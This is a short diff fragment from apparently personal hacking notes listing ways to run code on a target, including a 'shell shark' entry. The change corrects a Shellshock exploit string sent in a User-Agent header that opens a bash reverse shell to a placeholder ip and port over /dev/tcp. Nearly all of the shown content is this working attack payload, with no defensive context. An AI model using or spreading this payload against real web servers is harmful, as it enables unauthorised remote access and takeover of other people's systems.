@@ -29,6 +29,6 @@ you can run code
 3rd way
 mineweb --> shell shark
 
-user-agen: (){:;}; bash -i >& /dev/tcp/ip/port 0>&1
+user-agen: () { :; }; bash -i >& /dev/tcp/ip/port 0>&1
 
 
